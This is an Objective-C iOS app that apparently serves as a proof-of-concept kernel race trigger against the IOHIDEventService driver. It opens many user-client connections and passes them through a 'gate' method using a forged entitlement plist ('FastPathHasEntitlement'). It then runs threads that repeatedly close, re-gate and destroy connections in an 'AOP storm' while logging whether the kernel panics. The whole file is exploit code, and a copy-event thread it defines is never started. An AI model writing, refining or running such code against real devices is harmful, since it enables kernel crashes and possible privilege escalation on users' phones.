#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach_port.h>
#import <pthread.h>
#import <unistd.h>
#import <stdatomic.h>
#import <stdarg.h>

#define MAX_CONNS 32
#define NUM_COPY_THREADS 8

static UITextView *gLog = nil;
static volatile atomic_bool g_stop = ATOMIC_VAR_INIT(false);
static io_connect_t g_conns[MAX_CONNS];
static int g_conn_count = 0;
static io_service_t g_target_service = MACH_PORT_NULL;
static unsigned long g_copy_ok = 0, g_copy_err = 0;
static unsigned long g_close_ok = 0, g_close_err = 0;
static unsigned long g_probe_ok = 0, g_probe_fail = 0;
static NSData *g_gateXML;

static NSString *docsPath(void)
{
    return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
}
static NSString *logPath(void)
{
    return [docsPath() stringByAppendingPathComponent:@"hidgate4.log"];
}
static void appendLog(NSString *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[hidgate] %@", s);
    NSString *path = logPath();
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:path]) {
        [fm createFileAtPath:path contents:nil attributes:nil];
    }
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (fh) {
        @try {
            [fh seekToEndOfFile];
            [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
        } @finally {
            [fh closeFile];
        }
    }
    if (gLog) {
        dispatch_async(dispatch_get_main_queue(), ^{
            gLog.text = [gLog.text stringByAppendingFormat:@"%@\n", s];
            NSRange r = NSMakeRange(gLog.text.length, 0);
            [gLog scrollRangeToVisible:r];
        });
    }
}

static NSData *buildGateXML(void)
{
    NSDictionary *dict = @{
        @"FastPathHasEntitlement": @YES,
        @"FastPathMotionEventEntitlement": @YES,
    };
    NSError *err = nil;
    NSData *data = [NSPropertyListSerialization dataWithPropertyList:dict
        format:NSPropertyListXMLFormat_v1_0 options:0 error:&err];
    if (!data) appendLog(@"gate xml failed: %@", err);
    return data;
}

static kern_return_t gateConn(io_connect_t conn)
{
    uint64_t scalar = 0;
    return IOConnectCallMethod(conn, 0, &scalar, 1,
        g_gateXML.bytes, g_gateXML.length, NULL, NULL, NULL, NULL);
}

static void *threadChurn(void *arg)
{
    (void)arg;
    uint64_t scalar = 0;
    while (!atomic_load(&g_stop)) {
        if (g_conn_count > 0) {
            kern_return_t kr = IOConnectCallMethod(g_conns[0], 1, &scalar, 1,
                NULL, 0, NULL, NULL, NULL, NULL);
            if (kr == KERN_SUCCESS) g_close_ok++; else g_close_err++;
            gateConn(g_conns[0]);
        }
    }
    return NULL;
}

typedef struct { int idx; } ChurnArg;
static void *threadChurnIdx(void *arg)
{
    ChurnArg *a = (ChurnArg *)arg;
    int idx = a->idx;
    uint64_t scalar = 0;
    while (!atomic_load(&g_stop)) {
        if (idx < g_conn_count) {
            kern_return_t kr = IOConnectCallMethod(g_conns[idx], 1, &scalar, 1,
                NULL, 0, NULL, NULL, NULL, NULL);
            if (kr == KERN_SUCCESS) g_close_ok++; else g_close_err++;
            gateConn(g_conns[idx]);
        }
    }
    return NULL;
}

typedef struct { int idx; } CopyArg;
static void *threadCopyEvent(void *arg)
{
    CopyArg *a = (CopyArg *)arg;
    int idx = a->idx;
    uint64_t args[2] = { 0, 1 };
    while (!atomic_load(&g_stop)) {
        kern_return_t kr = IOConnectCallMethod(g_conns[idx], 2,
            args, 2, NULL, 0, NULL, NULL, NULL, NULL);
        if (kr == KERN_SUCCESS) g_copy_ok++; else g_copy_err++;
    }
    return NULL;
}

static void runScan(void)
{
    appendLog(@"build=hidgate4");
    g_gateXML = buildGateXML();
    if (!g_gateXML) return;

    io_iterator_t iter = MACH_PORT_NULL;
    kern_return_t kr = IOServiceGetMatchingServices(MACH_PORT_NULL,
        IOServiceMatching("IOHIDEventService"), &iter);
    appendLog(@"scan kr=%#x iter=%#x", kr, iter);
    if (kr != KERN_SUCCESS || iter == MACH_PORT_NULL) {
        appendLog(@"no iterator");
        return;
    }

    io_service_t svc;
    int n = 0;
    while ((svc = IOIteratorNext(iter)) != MACH_PORT_NULL) {
        uint64_t regid = 0;
        IORegistryEntryGetRegistryEntryID(svc, &regid);
        io_name_t cls;
        IOObjectGetClass(svc, cls);
        appendLog(@"svc[%d] id=%#llx class=%s", n, regid, cls);

        io_connect_t tmp[MAX_CONNS];
        int opened = 0;
        for (int i = 0; i < MAX_CONNS; i++) {
            tmp[i] = MACH_PORT_NULL;
            if (IOServiceOpen(svc, mach_task_self(), 2, &tmp[i]) == KERN_SUCCESS &&
                tmp[i] != MACH_PORT_NULL) {
                opened++;
            }
        }

        int ok = 0;
        for (int i = 0; i < opened; i++) {
            kern_return_t gr = gateConn(tmp[i]);
            if (gr == KERN_SUCCESS) {
                g_conns[ok++] = tmp[i];
            } else {
                IOServiceClose(tmp[i]);
            }
        }
        appendLog(@"  opened=%d gate_ok=%d", opened, ok);

        if (ok >= 2) {
            g_target_service = svc;
            IOObjectRetain(g_target_service);
            int keep = ok > 8 ? 8 : ok;
            for (int i = keep; i < ok; i++) {
                IOServiceClose(g_conns[i]);
            }
            g_conn_count = keep;
            IOObjectRelease(svc);
            break;
        }

        for (int i = 0; i < ok; i++) {
            IOServiceClose(g_conns[i]);
        }
        g_conn_count = 0;
        IOObjectRelease(svc);
        n++;
        if (n > 500) break;
    }
    IOObjectRelease(iter);

    appendLog(@"gate_ok=%d", g_conn_count);
    if (g_conn_count < 2) {
        appendLog(@"no free provider; done");
        return;
    }

    pthread_t churnThread;
    pthread_create(&churnThread, NULL, threadChurn, NULL);

    ChurnArg churnArgs[3];
    pthread_t churnThreads[3];
    for (int i = 0; i < 3; i++) {
        churnArgs[i].idx = i % g_conn_count;
        pthread_create(&churnThreads[i], NULL, threadChurnIdx, &churnArgs[i]);
    }

    appendLog(@"racing 120s AOP storm...");
    for (int iter = 0; iter < 1500; iter++) {
        io_connect_t probes[16];
        int pn = 0;
        for (int i = 0; i < 16; i++) {
            io_connect_t c = MACH_PORT_NULL;
            if (IOServiceOpen(g_target_service, mach_task_self(), 2, &c) == KERN_SUCCESS
                    && c != MACH_PORT_NULL) {
                if (gateConn(c) == KERN_SUCCESS) {
                    probes[pn++] = c;
                    g_probe_ok++;
                } else {
                    IOServiceClose(c);
                    g_probe_fail++;
                }
            } else {
                g_probe_fail++;
            }
        }
        for (int i = 0; i < pn; i++) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
            mach_port_destroy(mach_task_self(), probes[i]);
#pragma clang diagnostic pop
        }
        usleep(80000);
        if ((iter % 10) == 0) {
            appendLog(@"iter=%d probe_ok=%lu fail=%lu copy_ok=%lu copy_err=%lu close_ok=%lu close_err=%lu",
                iter, g_probe_ok, g_probe_fail, g_copy_ok, g_copy_err, g_close_ok, g_close_err);
        }
    }

    atomic_store(&g_stop, true);
    pthread_join(churnThread, NULL);
    for (int i = 0; i < 3; i++) pthread_join(churnThreads[i], NULL);
    appendLog(@"done no panic");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UITextView *textView;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application
    didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];
    self.textView = [[UITextView alloc] initWithFrame:vc.view.bounds];
    self.textView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    self.textView.backgroundColor = [UIColor blackColor];
    self.textView.textColor = [UIColor greenColor];
    self.textView.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.textView.editable = NO;
    [vc.view addSubview:self.textView];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    gLog = self.textView;
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runScan();
    });
    return YES;
}

@end

int main(int argc, char *argv[])
{
    @autoreleasepool {
        [[NSFileManager defaultManager] removeItemAtPath:logPath() error:nil];
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
